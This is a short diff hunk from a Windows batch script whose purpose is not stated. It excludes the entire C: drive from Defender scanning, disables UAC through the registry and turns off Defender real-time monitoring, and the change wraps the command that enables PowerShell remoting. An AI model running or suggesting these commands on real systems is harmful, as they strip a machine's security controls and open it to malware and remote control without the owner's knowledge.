@@ -8,7 +8,7 @@ powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
 :: UAC
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 
-Enable-PSRemoting -Force
+powershell -Command "Enable-PSRemoting -Force"
 
 :: Disable Real-time Monitoring
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
